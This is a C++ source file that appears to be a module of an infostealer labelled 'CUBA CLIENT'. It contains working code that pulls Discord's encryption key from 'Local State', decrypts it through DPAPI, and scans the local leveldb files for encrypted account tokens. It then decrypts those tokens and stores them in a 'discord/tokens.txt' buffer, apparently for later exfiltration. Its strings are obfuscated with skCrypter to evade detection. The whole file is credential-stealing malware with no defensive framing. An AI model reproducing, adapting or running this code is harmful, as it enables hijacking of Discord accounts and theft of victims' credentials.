#include <misc_stealing/discord.hpp>
#include <filesystem>
#include <fstream>
#include <vector>
#include <string>
#include <windows.h>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/crypto_helper.h>
#include <crypto_utils/base64.h>
#include <crypto_utils/skCrypter.hpp>
#include <json/json.hpp>

namespace fs = std::filesystem;

static inline std::string sk_str(const char* p) { return p; }
#define SK(x) sk_str(skCrypt(x))

namespace misc_exfiltration {

    static std::string extract_token_from_leveldb(const fs::path& leveldb_dir, const std::vector<BYTE>& aes_key) {
        if (!fs::exists(leveldb_dir))
            return "";

        const std::string prefix(skCrypt("dQw4w9WgXcQ:"));

        for (const auto& entry : fs::directory_iterator(leveldb_dir)) {
            auto ext = entry.path().extension().string();
            if (ext != SK(".ldb") && ext != SK(".log"))
                continue;

            try {
                std::ifstream file(entry.path(), std::ios::binary);
                std::string content((std::istreambuf_iterator<char>(file)), {});

                auto pos = content.find(prefix);
                if (pos == std::string::npos)
                    continue;

                pos += prefix.size();
                std::string b64;
                while (pos < content.size()) {
                    char c = content[pos];
                    if (!isalnum((unsigned char)c) && c != '+' && c != '/' && c != '=')
                        break;
                    b64 += c;
                    pos++;
                }

                if (b64.empty()) continue;

                std::string decoded = base64::from_base64(b64);
                if (decoded.empty()) continue;

                try {
                    auto dec = crypto_helper::aes_gcm_decrypt(
                        std::vector<BYTE>(decoded.begin(), decoded.end()), aes_key);
                    return std::string(dec.begin(), dec.end());
                } catch (const std::exception&) {}
            } catch (const std::exception&) {}
        }
        return "";
    }

    void steal_discord() {
        std::string appdata = features::get_home() + SK("\\AppData\\Roaming\\");

        static const std::vector<std::string> clients = {
            SK("discord"),
            SK("discordptb"),
            SK("discordcanary")
        };

        for (const auto& client : clients) {
            fs::path client_dir = fs::path(appdata) / client;
            if (!fs::exists(client_dir)) continue;

            //same key scheme as chromium
            fs::path local_state = client_dir / SK("Local State");
            if (!fs::exists(local_state)) continue;

            std::vector<BYTE> aes_key;
            try {
                std::ifstream ls_file(local_state);
                using json = nlohmann::json;
                json j;
                ls_file >> j;

                std::string k_crypt = SK("os_crypt");
                std::string k_ekey  = SK("encrypted_key");

                if (!j.contains(k_crypt) || !j[k_crypt].contains(k_ekey))
                    continue;

                std::string decoded = base64::from_base64(j[k_crypt][k_ekey].get<std::string>());
                decoded = decoded.substr(5); //strip DPAPI prefix
                std::vector<BYTE> enc(decoded.begin(), decoded.end());
                aes_key = crypto_helper::dpapi_unprotect(enc);
            } catch (const std::exception&) { continue; }

            if (aes_key.empty()) continue;

            fs::path leveldb = client_dir / SK("Local Storage") / SK("leveldb");
            std::string token = extract_token_from_leveldb(leveldb, aes_key);

            if (!token.empty()) {
                std::string entry;
                entry += skCrypt("Client: ") + client + "\n";
                entry += skCrypt("Token: ")  + token  + "\n";
                entry += skCrypt("\n-# CUBA CLIENT #-\n");
                mem_store::append(skCrypt("discord/tokens.txt"), entry);
            }
        }
    }
}
